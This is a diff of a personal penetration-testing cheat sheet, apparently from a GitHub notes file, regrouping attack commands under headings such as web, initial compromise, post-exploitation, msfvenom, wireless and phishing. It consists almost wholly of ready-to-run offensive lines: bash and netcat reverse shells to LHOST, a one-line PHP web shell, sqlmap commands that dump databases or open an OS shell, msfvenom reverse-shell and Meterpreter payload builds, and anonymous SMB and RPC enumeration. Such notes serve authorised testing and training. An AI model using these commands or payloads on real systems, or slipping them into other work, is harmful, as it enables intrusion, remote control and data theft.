@@ -3,18 +3,52 @@ https://github.com/melnicek/melnicek.github.io/edit/master/notes.txt
 rustscan -a `cat ip` -- -sVC -oN nmap
 sudo nmap -sU `cat ip` -oN nmap-udp
 
+################################################################ WEB
+
 ffuf -w ~/wordlists/raft.txt -of md -o ffuf-dir -u http://`cat ip`/FUZZ
 ffuf -w ~/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -of md -o ffuf-sub -u http://`cat ip`/ -H 'Host: FUZZ.DOMAIN'
 
 ffuf -w WORDLIST -u http://`cat ip`/?id=FUZZ
 ffuf -w WORDLIST -u http://`cat ip`/ -X POST -d 'id=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded'
 
-SecLists/Discovery/Web-Content/raft-large-words.txt
-SecLists/Discovery/Web-Content/raft-large-directories.txt
-SecLists/Discovery/Web-Content/raft-large-files.txt
-SecLists/Discovery/DNS/subdomains-top1million-110000.txt
-SecLists/Discovery/Web-Content/web-extensions.txt
-SecLists/Discovery/Web-Content/burp-parameter-names.txt
+gobuster dir -w WORDLIST -u URL -o OUTFILE
+
+nikto -host URL
+nikto -Plugins 'PLUGIN' -host URL
+
+sqlmap -r REQFILE --batch
+sqlmap -i URL -p PARAMETER --cookie="COOKIE" --batch
+sqlmap -i URL -p PARAMETER --cookie="COOKIE" --batch --current-user --current-db
+sqlmap -i URL -p PARAMETER --cookie="COOKIE" --batch -D DATABASE --tables
+sqlmap -i URL -p PARAMETER --cookie="COOKIE" --batch -D DATABASE -T TABLE --dump
+sqlmap -i URL -p PARAMETER --cookie="COOKIE" --batch --os-shell
+
+https://portswigger.net/web-security/sql-injection/cheat-sheet
+
+<pre><?php system($_REQUEST["yz"])?></pre><hr><form method="POST"><input type="text" id="yz" name="yz"><input type="submit" value="Submit"></form>
+
+https://github.com/mthbernardes/LFI-Enum.git
+
+################################################################ INITIAL COMPROMISE
+
+smbclient -L //RHOST
+smbclient //RHOST/SHARE
+smbclient -U '' -N //RHOST/SHARE
+smbclient -U USER //RHOST/SHARE
+
+snmp-check `cat ip`
+snmpwalk -v1 -c public `cat ip`
+snmpwalk -v2c -c public `cat ip`
+
+sudo mount -t cifs -o 'username=USER,password=PASS' //RHOST/SHARE /mnt/FOLDER
+
+rpcclient `cat ip`
+rpcclient -U '' -N `cat ip`
+> enumdomusers
+
+git clone https://github.com/SecureAuthCorp/impacket
+
+################################################################ POST LINUX
 
 bash -c 'bash -i >& /dev/tcp/LHOST/LPORT 0>&1'
 rm /tmp/y;mkfifo /tmp/y;cat /tmp/y|/bin/sh -i 2>&1|nc LHOST LPORT >/tmp/y
@@ -38,31 +72,6 @@ ssh -L LPORT:RHOST:RPORT USER@RHOST -fN
 for i in {1..254}; do (ping -c 1 x.x.x.${i} | grep "bytes from" &); done; sleep 2; arp -en | grep -v incomplete
 for i in {1..65535}; do (echo > /dev/tcp/x.x.x.x/$i) >/dev/null 2>&1 && echo $i is open; done
 
-smbclient -L //RHOST
-smbclient //RHOST/SHARE
-smbclient -U '' -N //RHOST/SHARE
-smbclient -U USER //RHOST/SHARE
-
-snmp-check `cat ip`
-snmpwalk -v1 -c public `cat ip`
-snmpwalk -v2c -c public `cat ip`
-
-sudo mount -t cifs -o 'username=USER,password=PASS' //RHOST/SHARE /mnt/FOLDER
-
-rpcclient `cat ip`
-rpcclient -U '' -N `cat ip`
-> enumdomusers
-
-gobuster dir -w WORDLIST -u URL -o OUTFILE
-
-sqlmap -r REQFILE --batch
-
-https://portswigger.net/web-security/sql-injection/cheat-sheet
-
-<pre><?php system($_REQUEST["yz"])?></pre><hr><form method="POST"><input type="text" id="yz" name="yz"><input type="submit" value="Submit"></form>
-
-https://github.com/mthbernardes/LFI-Enum.git
-
 sudo tcpdump -D
 sudo tcpdump -i INTERFACE
 sudo tcpdump -i INTERFACE -e
@@ -71,7 +80,7 @@ sudo tcpdump -i INTERFACE host HOST
 sudo tcpdump -i INTERFACE src host HOST
 sudo tcpdump -i INTERFACE tcp src port PORT
 
-for i in {1..254}; do (ping -c 1 x.x.x.${i} | grep "bytes from" &); done; sleep 2; arp -en | grep -v incomplete
+################################################################ RECON
 
 amass enum -d DOMAIN -ip -src -dir OUT
 amass intel -asn ASN -dir OUT
@@ -102,14 +111,8 @@ recon-ng
 > info
 > run
 
-recon-web --host 0.0.0.0
+################################################################ MSFVENOM
 
-setoolkit
-
-nikto -host URL/RHOST/FILE
-nikto -Plugins 'PLUGIN' -host URL
-
-## raw shell
 msfvenom -p windows/shell/reverse_tcp LHOST=LHOST LPORT=LPORT -f exe > shell-x86.exe
 msfvenom -p windows/x64/shell/reverse_tcp LHOST=LHOST LPORT=LPORT -f exe > shell-x64.exe
 msfvenom -p windows/shell_reverse_tcp LHOST=LHOST LPORT=LPORT -f exe > shell-x86.exe
@@ -123,7 +126,6 @@ msfvenom -p java/jsp_shell_reverse_tcp LHOST=LHOST LPORT=LPORT -f raw > shell.js
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=LHOST LPORT=LPORT -f war > shell.war
 msfvenom -p windows/shell/reverse_tcp LHOST=LHOST LPORT=LPORT -f asp > shell.asp
 
-## meterpreter
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=LHOST LPORT=LPORT -f exe > shell-x86.exe
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=LHOST LPORT=LPORT -f exe > shell-x64.exe
 msfvenom -p windows/meterpreter_reverse_tcp LHOST=LHOST LPORT=LPORT -f exe > shell-x86.exe
@@ -137,6 +139,8 @@ msfvenom -p java/jsp_shell_reverse_tcp LHOST=LHOST LPORT=LPORT -f raw > example.
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=LHOST LPORT=LPORT -f war > example.war
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=LHOST LPORT=LPORT -f asp > shell.asp
 
+################################################################ WIRELESS
+
 airmon-ng check
 airmon-ng check kill
 airmon-ng start INTERFACE
@@ -149,21 +153,17 @@ systemctl start network-manager
 
 git clone https://github.com/P0cL4bs/wifipumpkin3
 
+################################################################ PHISHING
+
 git clone https://github.com/gophish/gophish
 
 git clone https://github.com/rsmusllp/king-phisher
 
 git clone https://github.com/curi0usJack/luckystrike
 
-sqlmap -i URL -p PARAMETER --cookie="COOKIE" --batch
-sqlmap -i URL -p PARAMETER --cookie="COOKIE" --batch --current-user --current-db
-sqlmap -i URL -p PARAMETER --cookie="COOKIE" --batch -D DATABASE --tables
-sqlmap -i URL -p PARAMETER --cookie="COOKIE" --batch -D DATABASE -T TABLE --dump
-sqlmap -i URL -p PARAMETER --cookie="COOKIE" --batch --os-shell
-
 git clone https://github.com/sevagas/macro_pack
 
-git clone https://github.com/SecureAuthCorp/impacket
+################################################################ ANDROID
 
 adb shell pm list packages
 adb shell pm path PACKAGE
